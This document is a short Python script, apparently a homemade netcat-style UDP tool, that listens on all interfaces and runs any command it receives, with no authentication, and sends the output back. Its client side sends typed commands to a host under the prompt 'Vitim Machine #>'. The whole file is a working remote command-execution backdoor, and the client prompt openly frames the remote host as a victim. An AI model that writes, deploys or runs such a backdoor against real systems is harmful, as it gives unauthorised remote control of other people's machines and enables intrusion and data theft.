#!/usr/bin/python3
from socket import *
from sys import *
from argparse import *
from subprocess import *


def help():
    print("Usage: ./nc.py -t <target_host> -p <port>\n")
    print("Examples:")
    print("-------------------------")
    print(" User mode ")
    print("./nc.py -t 127.0.0.1 -p 9999\n")
    print(" Listening mode ")
    print("./nc.py -l -p 9999\n")


def main():
    if len(argv[1:]) < 2:
        help()

    parser = ArgumentParser(add_help=False)
    parser.add_argument('-t', '--target')
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-l', '--listen', action='store_true')
    args = parser.parse_args()

    s = socket(AF_INET, SOCK_DGRAM, 0)

    # Server
    if args.listen == True:
        if args.target:
            print("Listening mode do not use -t")
            exit()
        s.bind(("0.0.0.0", args.port))

        while True:
            msg, adder = s.recvfrom(65000)
            cmd = msg.decode('ascii')
            data = cmd[0:].split(' ')

            if len(data[0:]) > 1:
                res = run([data[0], data[1]], stdout=PIPE)
            else:
                res = run([cmd], stdout=PIPE)

            here = res.stdout.decode('utf-8')
            s.sendto(here.encode('utf-8'), adder)

    # Client
    else:
        while True:
            c = input("Vitim Machine #>")
            s.sendto(c.encode('ascii'), (args.target, args.port))
            r_msg, adder = s.recvfrom(65000)
            print(r_msg.decode('utf-8'))


if __name__ == '__main__':
    main()
